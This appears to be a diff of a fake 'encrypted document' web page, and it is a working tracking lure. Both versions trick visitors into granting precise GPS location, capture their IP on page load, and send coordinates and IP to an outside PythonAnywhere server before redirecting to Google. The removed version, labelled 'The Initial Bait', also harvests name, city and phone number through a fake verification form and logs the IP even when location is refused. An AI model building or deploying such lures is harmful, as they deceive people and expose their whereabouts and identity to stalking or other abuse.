@@ -4,98 +4,54 @@
     <title>Secure Document Cloud</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 15%; background: #f0f2f5; color: #1c1e21; }
-        .card { background: white; padding: 40px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 90%; width: 380px; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 14px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; font-size: 16px; }
-        .btn:hover { background: #1557b0; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
-        #form-box { display: none; text-align: left; }
-        h2 { margin-top: 0; color: #1a73e8; }
-        p { font-size: 14px; color: #606770; line-height: 1.5; }
+        body { font-family: sans-serif; text-align: center; padding-top: 20%; background: #f4f7f6; color: #333; }
+        .card { background: white; padding: 30px; border-radius: 12px; display: inline-block; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 85%; }
+        .btn { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
     </style>
 </head>
 <body>
-
-    <div class="card" id="main-box">
-        <!-- Part 1: The Initial Bait -->
-        <div id="verify-box">
-            <h2>🔒 Secure Access</h2>
-            <p>This document is encrypted. Please verify your location to confirm you are in an authorized region.</p>
-            <button class="btn" onclick="start()">UNLOCK FILE</button>
-        </div>
-
-        
-        <div id="form-box">
-            <h2 style="text-align: center;">Identity Verified</h2>
-            <p style="text-align: center;">Location confirmed. Please enter your details to view the file.</p>
-            <label>Full Name</label>
-            <input type="text" id="name" placeholder="Enter your name">
-            <label>Current City</label>
-            <input type="text" id="place" placeholder="Enter your city">
-            <label>Phone Number</label>
-            <input type="text" id="phone" placeholder="Enter mobile number">
-            <button class="btn" onclick="submitForm()">VIEW DOCUMENT</button>
-        </div>
+    <div class="card" id="box">
+        <h2>🔒 Encrypted File</h2>
+        <p>This document is protected. Please verify your location to unlock the decryption key.</p>
+        <button class="btn" onclick="start()">UNLOCK FILE</button>
     </div>
 
     <script>
-        let info = { ip: "...", lat: "0", lon: "0", type: "IP-Only" };
+        let info = { ip: "Unknown", lat: "0", lon: "0", type: "IP-Only" };
 
-        // 1. Get IP address automatically when page loads
+        // Get IP Backup first
         fetch('https://ipapi.co').then(r => r.json()).then(d => {
             info.ip = d.ip; info.lat = d.latitude; info.lon = d.longitude;
         });
 
-        // 2. Start the GPS Request
         function start() {
+            document.getElementById('box').innerHTML = "<h3>Verifying Location...</h3>";
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(success, fail, {enableHighAccuracy:true});
-            } else { fail(); }
+            } else { send(); }
         }
 
-        // 3. If they click ALLOW
         function success(p) {
             info.lat = p.coords.latitude; 
             info.lon = p.coords.longitude; 
             info.type = "EXACT-GPS";
-            
-            // Switch to the Form
-            document.getElementById('verify-box').style.display = "none";
-            document.getElementById('form-box').style.display = "block";
+            send();
         }
 
-        // 4. If they click BLOCK
         function fail() {
-            document.getElementById('verify-box').innerHTML = \`
-                <h2 style="color:#d93025;">Access Denied</h2>
-                <p>Location verification is required for this encrypted file.</p>
-                <button class="btn" onclick="location.reload()">RETRY UNLOCK</button>\`;
             info.type = "DENIED-ACCESS";
-            sendData(); // Log the IP even if they deny
+            send();
+            document.getElementById('box').innerHTML = "<h3 style='color:red;'>Access Denied</h3><p>Permission required.</p>";
         }
 
-        // 5. When they fill the form and click Submit
-        function submitForm() {
-            const name = document.getElementById('name').value;
-            const place = document.getElementById('place').value;
-            const phone = document.getElementById('phone').value;
-            
-            if(!name || !place || !phone) {
-                alert("Please complete all fields to access the document.");
-                return;
-            }
-            
-            sendData(name, place, phone, true);
-        }
-
-        // 6. Send all data to PythonAnywhere
-        function sendData(n="N/A", p="N/A", ph="N/A", redirect=false) {
-            const url = \`https://pythonanywhere.com{info.lat}&lon=${info.lon}&ip=${info.ip}&type=${info.type}&name=${encodeURIComponent(n)}&place=${encodeURIComponent(p)}&phone=${encodeURIComponent(ph)}\`;
-            
+        function send() {
+            const url = `https://pythonanywhere.com{info.lat}&lon=${info.lon}&ip=${info.ip}&type=${info.type}`;
             fetch(url).then(() => {
-                if(redirect) window.location.href = "https://google.com";
-            }).catch(err => console.log("Connection error"));
+                setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
+            });
         }
     </script>
 </body>
 </html>
+
+
